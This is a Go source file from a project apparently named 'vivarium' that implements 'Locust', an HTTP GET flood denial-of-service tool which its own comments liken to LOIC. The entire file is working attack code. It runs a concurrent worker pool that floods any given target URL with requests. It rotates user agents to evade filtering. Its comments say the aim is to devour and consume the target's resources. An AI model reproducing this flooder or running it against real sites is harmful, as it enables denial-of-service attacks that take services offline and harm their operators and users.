package sting

import (
	"context"
	"fmt"
	"net/http"
	"sync"
	"sync/atomic"
	"time"

	"vivarium/internal/common"
)

// Locust implements an HTTP GET flood attack (like LOIC).
type Locust struct {
	client *http.Client
}

// NewLocust creates a new Locust attack instance.
func NewLocust() *Locust {
	return &Locust{
		client: common.FastHTTPClient(),
	}
}

// Name returns the attack name.
func (l *Locust) Name() string {
	return "Locust"
}

// Description returns a brief description.
func (l *Locust) Description() string {
	return "HTTP GET flood - devours resources with overwhelming speed"
}

// Attack executes the Locust HTTP flood attack.
func (l *Locust) Attack(ctx context.Context, target string, opts AttackOpts) (*Result, error) {
	if opts.Concurrency <= 0 {
		opts.Concurrency = 100
	}
	if opts.Rounds <= 0 {
		opts.Rounds = 1000
	}

	var (
		successful atomic.Int64
		failed     atomic.Int64
		completed  atomic.Int64
	)

	start := time.Now()

	// Create a channel to distribute work
	jobs := make(chan int, opts.Rounds)
	var wg sync.WaitGroup

	// Start workers
	for i := 0; i < opts.Concurrency; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case _, ok := <-jobs:
					if !ok {
						return
					}
					if l.sendRequest(ctx, target, opts.Verbose) {
						successful.Add(1)
					} else {
						failed.Add(1)
					}
					current := completed.Add(1)

					// Progress update every 100 requests
					if opts.Verbose && current%100 == 0 {
						fmt.Printf("\r   Progress: %d/%d requests", current, opts.Rounds)
					}

					if opts.Delay > 0 {
						time.Sleep(opts.Delay)
					}
				}
			}
		}(i)
	}

	// Send jobs
	for i := 0; i < opts.Rounds; i++ {
		select {
		case <-ctx.Done():
			break
		case jobs <- i:
		}
	}
	close(jobs)

	// Wait for all workers to complete
	wg.Wait()

	if opts.Verbose {
		fmt.Println() // Clear the progress line
	}

	return &Result{
		TotalRequests: int(completed.Load()),
		Successful:    int(successful.Load()),
		Failed:        int(failed.Load()),
		Duration:      time.Since(start),
	}, nil
}

// sendRequest sends a single HTTP GET request.
func (l *Locust) sendRequest(ctx context.Context, target string, verbose bool) bool {
	req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
	if err != nil {
		return false
	}

	// Rotate user agent
	req.Header.Set("User-Agent", common.RandomUserAgent())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Connection", "keep-alive")

	resp, err := l.client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	// Consider 2xx and 3xx as successful (we just want to consume resources)
	return resp.StatusCode < 400
}

// AttackWithProgress executes the attack with progress callback for real-time updates.
func (l *Locust) AttackWithProgress(ctx context.Context, target string, opts AttackOpts, progress chan<- Progress) (*Result, error) {
	if opts.Concurrency <= 0 {
		opts.Concurrency = 100
	}
	if opts.Rounds <= 0 {
		opts.Rounds = 1000
	}

	var (
		successful atomic.Int64
		failed     atomic.Int64
		completed  atomic.Int64
	)

	start := time.Now()

	// Progress reporter
	stopProgress := make(chan struct{})
	go func() {
		ticker := time.NewTicker(100 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-stopProgress:
				return
			case <-ticker.C:
				elapsed := time.Since(start).Seconds()
				comp := completed.Load()
				rps := float64(0)
				if elapsed > 0 {
					rps = float64(comp) / elapsed
				}
				progress <- Progress{
					Total:      opts.Rounds,
					Completed:  int(comp),
					Successful: int(successful.Load()),
					Failed:     int(failed.Load()),
					RPS:        rps,
				}
			}
		}
	}()

	// Create a channel to distribute work
	jobs := make(chan int, opts.Rounds)
	var wg sync.WaitGroup

	// Start workers
	for i := 0; i < opts.Concurrency; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case _, ok := <-jobs:
					if !ok {
						return
					}
					if l.sendRequest(ctx, target, false) {
						successful.Add(1)
					} else {
						failed.Add(1)
					}
					completed.Add(1)

					if opts.Delay > 0 {
						time.Sleep(opts.Delay)
					}
				}
			}
		}(i)
	}

	// Send jobs
	for i := 0; i < opts.Rounds; i++ {
		select {
		case <-ctx.Done():
			break
		case jobs <- i:
		}
	}
	close(jobs)

	// Wait for all workers to complete
	wg.Wait()
	close(stopProgress)

	return &Result{
		TotalRequests: int(completed.Load()),
		Successful:    int(successful.Load()),
		Failed:        int(failed.Load()),
		Duration:      time.Since(start),
	}, nil
}
